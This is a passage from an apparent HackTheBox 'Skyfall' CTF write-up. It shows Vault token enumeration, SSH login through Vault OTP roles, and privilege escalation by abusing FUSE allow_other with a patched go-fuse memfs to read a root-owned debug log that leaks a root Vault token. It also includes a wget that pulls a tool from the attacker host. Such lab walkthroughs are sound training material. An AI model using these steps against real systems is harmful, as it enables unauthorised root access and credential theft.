+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-XGET</span> <span class="s2">"http://prd23-vault-internal.skyfall.htb/v1/sys/policy/developers"</span> <span class="nt">-H</span> <span class="s1">'X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE'</span> | jq <span class="s1">'.rules'</span> <span class="nt">-r</span>
+<span class="go">path "sys/policy/developers" {
+  capabilities = [  "read" ]
+}
+
+path "ssh/*" {
+  capabilities = [ "list" ]
+}
+
+path "ssh/creds/dev_otp_key_role" {
+  capabilities = ["create", "read", "update"]
+}
+</span></code></pre></div></div>
+<p>It’s showing that this token has access to this SSH role, <code class="language-plaintext highlighter-rouge">dev_otp_key_role</code>.</p>
+<h4 id="sysinternaluiresultant-acl">sys/internal/ui/resultant-acl</h4>
+<p><a href="https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v">This StackOverflow</a> answer shows another endpoint in the CLI that will dump all the capabilities of the current token:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="700"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault <span class="nb">read </span>sys/internal/ui/resultant-acl <span class="nt">--format</span><span class="o">=</span>json|jq <span class="nt">-r</span> .data
+<span class="go">
+{
+  "exact_paths": {
+    "auth/token/lookup-self": {
+      "capabilities": [
+        "read"
+      ]
+    },
+    "auth/token/renew-self": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "auth/token/revoke-self": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "ssh/creds/dev_otp_key_role": {
+      "capabilities": [
+        "create",
+        "read",
+        "update"
+      ]
+    },
+    "sys/capabilities-self": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/control-group/request": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/internal/ui/resultant-acl": {
+      "capabilities": [
+        "read"
+      ]
+    },
+    "sys/leases/lookup": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/leases/renew": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/policy/developers": {
+      "capabilities": [
+        "read"
+      ]
+    },
+    "sys/renew": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/tools/hash": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/wrapping/lookup": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/wrapping/unwrap": {
+      "capabilities": [
+        "update"
+      ]
+    },
+    "sys/wrapping/wrap": {
+      "capabilities": [
+        "update"
+      ]
+    }
+  },
+  "glob_paths": {
+    "cubbyhole/": {
+      "capabilities": [
+        "create",
+        "delete",
+        "list",
+        "read",
+        "update"
+      ]
+    },
+    "ssh/": {
+      "capabilities": [
+        "list"
+      ]
+    },
+    "sys/tools/hash/": {
+      "capabilities": [
+        "update"
+      ]
+    }
+  },
+  "root": false
+}
+</span></code></pre></div></div>
+<p>This output shows that this token has <code class="language-plaintext highlighter-rouge">create</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">update</code> capabilities on <code class="language-plaintext highlighter-rouge">ssh/creds/dev_otp_key_role</code>.</p>
+<h4 id="ssh-1">SSH</h4>
+<p>Knowing that this token can access <code class="language-plaintext highlighter-rouge">dev_otp_key_role</code>, and with a list of usernames from MinIO, I’ll start trying to log in over SSH with <code class="language-plaintext highlighter-rouge">vault</code>. askyy is the lead developer who had this token in their <code class="language-plaintext highlighter-rouge">.bashrc</code>, so I’ll try them first:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault ssh <span class="nt">-role</span> dev_otp_key_role <span class="nt">-mode</span> otp askyy@skyfall.htb
+<span class="go">failed to run ssh command: exit status 6
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">vault ssh</code> requires a mode, and given the term “otp” in the role name, I’ll go with that. The binary here is making a request to the API (<code class="language-plaintext highlighter-rouge">/v1/ssh/creds/dev_otp_key_role</code>) and using the password it gets back with <code class="language-plaintext highlighter-rouge">sshpass</code> to try to connect. It still may fail.</p>
+<p>Exit status 6, which the <code class="language-plaintext highlighter-rouge">sshpass</code> <a href="https://linux.die.net/man/1/sshpass">man page</a> says:</p>
+<blockquote>
+<p>As with any other program, sshpass returns 0 on success. In case of failure, the following return codes are used:</p>
+<ol>
+<li>Invalid command line argument</li>
+<li>Conflicting arguments given</li>
+<li>General runtime error</li>
+<li>Unrecognized response from ssh (parse error)</li>
+<li>Invalid/incorrect password</li>
+<li>Host public key is unknown. sshpass exits without confirming the new key.</li>
+</ol>
+</blockquote>
+<p>It’s a public key issue! If I add in <code class="language-plaintext highlighter-rouge">--strict-host-key-checking=no</code>, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault ssh <span class="nt">--role</span> dev_otp_key_role <span class="nt">--mode</span> otp <span class="nt">--strict-host-key-checking</span><span class="o">=</span>no askyy@skyfall.htb
+<span class="go">Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+...[snip]...
+</span><span class="gp">askyy@skyfall:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>Alternatively, if I ever connect to this SSH and accept the key (even without the right password), it’ll also work.</p>
+<p>And I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">ee11cbb1************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>askyy is the only user with a home directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">askyy
+</span></code></pre></div></div>
+<p>And the only non-root user with a shell set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/home$</span><span class="w"> </span><span class="nb">grep</span> <span class="s2">"sh$"</span> /etc/passwd
+<span class="go">root:x:0:0:root:/root:/bin/bash
+askyy:x:1000:1000:Aurora Skyy:/home/askyy:/bin/bash
+</span></code></pre></div></div>
+<h4 id="sudo">sudo</h4>
+<p>There’s a <code class="language-plaintext highlighter-rouge">sudo</code> rule for askyy:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:~$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for askyy on skyfall:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User askyy may run the following commands on skyfall:
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
+</span></code></pre></div></div>
+<p>This user can run the <code class="language-plaintext highlighter-rouge">vault-unseal</code> binary with a specific <code class="language-plaintext highlighter-rouge">yaml</code> file and with one or more of the arguments <code class="language-plaintext highlighter-rouge">vdh</code>.</p>
+<p>Running this program with <code class="language-plaintext highlighter-rouge">-h</code> shows the help menu:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:~$</span><span class="w"> </span><span class="nb">sudo</span> /root/vault/vault-unseal <span class="nt">-c</span> /etc/vault-unseal.yaml <span class="nt">-h</span>
+<span class="go">Usage:
+  vault-unseal [OPTIONS]
+
+Application Options:
+  -v, --verbose        enable verbose output
+  -d, --debug          enable debugging output to file (extra logging)
+  -c, --config=PATH    path to configuration file
+
+Help Options:
+  -h, --help           Show this help message
+</span></code></pre></div></div>
+<p>It looks like a modified version of <a href="https://github.com/lrstanley/vault-unseal">this program</a>. Instead of offering <code class="language-plaintext highlighter-rouge">--log-path</code>, it offers <code class="language-plaintext highlighter-rouge">--debug</code>.</p>
+<p>Running it does generate a <code class="language-plaintext highlighter-rouge">debug.log</code> file in the current directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:~$</span><span class="w"> </span><span class="nb">sudo</span> /root/vault/vault-unseal <span class="nt">-c</span> /etc/vault-unseal.yaml <span class="nt">-vd</span>
+<span class="go">[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[&gt;] Check interval: 5s
+[&gt;] Max checks: 5
+[&gt;] Checking seal status
+[+] Vault sealed: false
+</span><span class="gp">askyy@skyfall:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+-rw------- 1 root root  590 Aug 27 12:37 debug.log
+-rw-r----- 1 root askyy  33 Aug 25 17:49 user.txt
+</span></code></pre></div></div>
+<p>It is owned by root and only readable by root. askyy can rename it and delete it, but not access it’s contents directly.</p>
+<h3 id="abusing-fuse">Abusing Fuse</h3>
+<h4 id="background">Background</h4>
+<p>This is a rather niche case, but there’s a file that root is writing that I want to read. I can control where it writes, but still can’t see it.</p>
+<p>I’m going to abuse <a href="https://en.wikipedia.org/wiki/Filesystem_in_Userspace">Filesystem in Userspace</a> (or FUSE) for this. It’s installed on many Linux distros by default and used for virtual filesystems. In the default <code class="language-plaintext highlighter-rouge">/etc/fuse.conf</code>, there’s one risky option (I believe commented out by default), <code class="language-plaintext highlighter-rouge">user_allow_other</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The file /etc/fuse.conf allows for the following parameters:</span>
+<span class="c">#</span>
+<span class="c"># user_allow_other - Using the allow_other mount option works fine as root, in</span>
+<span class="c"># order to have it work as user you need user_allow_other in /etc/fuse.conf as</span>
+<span class="c"># well. (This option allows users to use the allow_other option.) You need</span>
+<span class="c"># allow_other if you want users other than the owner to access a mounted fuse.</span>
+<span class="c"># This option must appear on a line by itself. There is no value, just the</span>
+<span class="c"># presence of the option.</span>
+
+<span class="c">#user_allow_other</span>
+
+
+<span class="c"># mount_max = n - this option sets the maximum number of mounts.</span>
+<span class="c"># Currently (2014) it must be typed exactly as shown</span>
+<span class="c"># (with a single space before and after the equals sign).</span>
+
+<span class="c">#mount_max = 1000</span>
+</code></pre></div></div>
+<p><a href="https://superuser.com/a/1242432">This StackOverflow answer</a> goes into the risks of this configuration.</p>
+<p>Basically, when a user creates a filesystem, without this option, only that user can access the filesystem. However, once <code class="language-plaintext highlighter-rouge">user_allow_other</code> is activated, then other users can create filesystems that other users can access.</p>
+<h4 id="fuse-applications">FUSE Applications</h4>
+<p>A very common FUSE application is <a href="https://linux.die.net/man/1/sshfs">sshfs</a>, which allows for creating a filesystem on a remote computer over SSH. So in theory, I could SSHFS from Skyfall back into my host, creating a mount on Skyfall that maps to a folder on my host. Then, because of <code class="language-plaintext highlighter-rouge">user_allow_others</code>, when root writes the log file to this mount, it will show up on my system, and I can access it as the user I SSHed as.</p>
+<p>However, opening my machine to SSH in the HTB labs is something I generally avoid doing. There’s a neat Go project, <a href="https://github.com/hanwen/go-fuse">go-fuse</a>, that has a bunch of example scripts the create various FUSE-based applications. One of particular interest is <a href="https://github.com/hanwen/go-fuse">memfs</a>. This mounts a folder as a FUSE filesystem, and logs all files written to into that FS to files.</p>
+<h4 id="local-memfs-demo">Local memfs Demo</h4>
+<p>I’ll clone the repo to my box and go into the <code class="language-plaintext highlighter-rouge">examples/memfs</code> directory. There I’ll build the project:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">main.go
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>go build
+<span class="go">error obtaining VCS status: exit status 128
+        Use -buildvcs=false to disable VCS stamping.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>go build <span class="nt">-buildvcs</span><span class="o">=</span><span class="nb">false</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">main.go  memfs
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">memfs</code> binary takes a directory to mount and a prefix for the output files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./memfs 
+<span class="go">usage: main MOUNTPOINT BACKING-PREFIX
+</span></code></pre></div></div>
+<p>I’ll create a test directory and run it, where it hangs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./memfs ~/testfs/ memfsoutput-
+<span class="go">Mounted!
+</span></code></pre></div></div>
+<p>From another terminal, I’ll write some files into the new FS:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"testing..."</span> <span class="o">&gt;</span> testfs/test1
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"testing again..."</span> <span class="o">&gt;</span> testfs/test2
+</code></pre></div></div>
+<p>In the directory I ran <code class="language-plaintext highlighter-rouge">memfs</code> from, there’s two new files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">main.go  memfs  memfsoutput-1  memfsoutput-2
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>memfsoutput-1
+<span class="go">testing...
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>memfsoutput-2
+<span class="go">testing again...
+</span></code></pre></div></div>
+<p>If I try to write to the filesystem as root, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky:/home/oxdf#</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"this is a root test"</span> <span class="o">&gt;</span> testfs/from_root
+<span class="go">-bash: testfs/from_root: Permission denied
+</span></code></pre></div></div>
+<p>That’s because my system isn’t set up with <code class="language-plaintext highlighter-rouge">user_allow_others</code>. If I go into <code class="language-plaintext highlighter-rouge">/etc/fuse.conf</code> and uncomment that line, it still fails. I’ll need to update the Go script slightly. I’ll kill the mount, and <code class="language-plaintext highlighter-rouge">sudo umount ~/testfs</code>.</p>
+<p>In <code class="language-plaintext highlighter-rouge">main.go</code>, I’ll add an option for the <code class="language-plaintext highlighter-rouge">fuse</code> creation:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">server</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">fuse</span><span class="o">.</span><span class="n">NewServer</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">RawFS</span><span class="p">(),</span> <span class="n">mountPoint</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fuse</span><span class="o">.</span><span class="n">MountOptions</span><span class="p">{</span>
+                <span class="n">Debug</span><span class="o">:</span> <span class="o">*</span><span class="n">debug</span><span class="p">,</span>
+                <span class="n">AllowOther</span><span class="o">:</span> <span class="no">true</span><span class="p">,</span> <span class="c">// added this</span>
+        <span class="p">})</span>
+</code></pre></div></div>
+<p>Now I’ll rebuild and re-mount:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>go build <span class="nt">-buildvcs</span><span class="o">=</span><span class="nb">false</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>./memfs ~/testfs/ memfsoutput-
+<span class="go">Mounted!
+</span></code></pre></div></div>
+<p>Now from a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky:/home/oxdf#</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"now it should work"</span> <span class="o">&gt;</span> testfs/as_root
+<span class="gp">root@hacky:/home/oxdf#</span><span class="w"> </span><span class="nb">cat </span>testfs/as_root 
+<span class="go">now it should work
+</span></code></pre></div></div>
+<p>And the file got logged:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@hacky:/home/oxdf#</span><span class="w"> </span><span class="nb">cat </span>hackthebox/skyfall-10.10.11.254/go-fuse/example/memfs/memfsoutput-1 
+<span class="go">now it should work
+</span></code></pre></div></div>
+<h4 id="on-skyfall">On Skyfall</h4>
+<p>I’ll upload the compiled <code class="language-plaintext highlighter-rouge">memfs</code> to Skyfall, create a directory, and mount it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/dev/shm$</span><span class="w"> </span>wget 10.10.14.6/memfs
+<span class="go">--2024-08-27 18:33:29--  http://10.10.14.6/memfs
+Connecting to 10.10.14.6:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3500122 (3.3M) [application/octet-stream]
+Saving to: ‘memfs’
+
+memfs                   100%[=============================&gt;]   3.34M  11.8MB/s    in 0.3s    
+
+2024-08-27 18:33:30 (11.8 MB/s) - ‘memfs’ saved [3500122/3500122]
+
+</span><span class="gp">askyy@skyfall:/dev/shm$</span><span class="w"> </span><span class="nb">mkdir </span>out
+<span class="gp">askyy@skyfall:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x memfs 
+<span class="gp">askyy@skyfall:/dev/shm$</span><span class="w"> </span>./memfs
+<span class="go">usage: main MOUNTPOINT BACKING-PREFIX
+</span><span class="gp">askyy@skyfall:/dev/shm$</span><span class="w"> </span>./memfs out/ out
+<span class="go">Mounted!
+</span></code></pre></div></div>
+<p>In another SSH window, I’ll go into that directory and run <code class="language-plaintext highlighter-rouge">vault-unseal</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/dev/shm/out$</span><span class="w"> </span><span class="nb">cat </span>debug.log 
+<span class="go">2024/08/27 18:34:49 Initializing logger...
+2024/08/27 18:34:49 Reading: /etc/vault-unseal.yaml
+2024/08/27 18:34:49 Security Risk!
+2024/08/27 18:34:49 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+2024/08/27 18:34:49 Found Vault node: http://prd23-vault-internal.skyfall.htb
+2024/08/27 18:34:49 Check interval: 5s
+2024/08/27 18:34:49 Max checks: 5
+2024/08/27 18:34:49 Establishing connection to Vault...
+2024/08/27 18:34:49 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+2024/08/27 18:34:49 Checking seal status
+2024/08/27 18:34:49 Vault sealed: false
+</span></code></pre></div></div>
+<p>It created <code class="language-plaintext highlighter-rouge">debug.log</code>, but because of where it’s stored, it’s owned by askyy:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/dev/shm/out$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 4
+-rw------- 1 askyy askyy 590 Aug 27 18:34 debug.log
+</span></code></pre></div></div>
+<h3 id="admin-vault">Admin Vault</h3>
+<h4 id="debuglog">debug.log</h4>
+<p>The <code class="language-plaintext highlighter-rouge">debug.log</code> file leads the token being used with it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">askyy@skyfall:/dev/shm/out$</span><span class="w"> </span><span class="nb">cat </span>debug.log 
+<span class="go">2024/08/27 18:34:49 Initializing logger...
+2024/08/27 18:34:49 Reading: /etc/vault-unseal.yaml
+2024/08/27 18:34:49 Security Risk!
+2024/08/27 18:34:49 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+2024/08/27 18:34:49 Found Vault node: http://prd23-vault-internal.skyfall.htb
+2024/08/27 18:34:49 Check interval: 5s
+2024/08/27 18:34:49 Max checks: 5
+2024/08/27 18:34:49 Establishing connection to Vault...
+2024/08/27 18:34:49 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+2024/08/27 18:34:49 Checking seal status
+2024/08/27 18:34:49 Vault sealed: false
+</span></code></pre></div></div>
+<h4 id="login">Login</h4>
+<p>This token works via the <code class="language-plaintext highlighter-rouge">vault login</code> command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault login
+<span class="go">Token (will be hidden): 
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+                                               
+Key                  Value                                                                    
+---                  -----  
+token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG                
+token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu                                                 
+token_duration       ∞                         
+token_renewable      false
+token_policies       ["root"]               
+identity_policies    []       
+policies             ["root"]
+</span></code></pre></div></div>
+<p>It has the <code class="language-plaintext highlighter-rouge">root</code> policy! That’s promising.</p>
+<h4 id="ssh-2">SSH</h4>
+<p>There’s a bunch of enumeration I could do, but I’ll remember there were two SSH roles:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault list ssh/roles
+<span class="go">Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+</span></code></pre></div></div>
+<p>This token can read the roles:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault <span class="nb">read </span>ssh/roles/admin_otp_key_role
+<span class="go">Key                  Value
+---                  -----
+allowed_users        root
+cidr_list            10.0.0.0/8
+default_user         nobody
+exclude_cidr_list    n/a
+key_type             otp
+port                 22
+</span></code></pre></div></div>
+<p>The user allowed is root. I’ll SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault ssh <span class="nt">-role</span> admin_otp_key_role <span class="nt">-mode</span> otp root@skyfall.htb
+<span class="go">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+...[snip]...
+</span><span class="gp">root@skyfall:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@skyfall:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">27c61477************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2024/08/31/htb-skyfall.html"></a>
+</article>
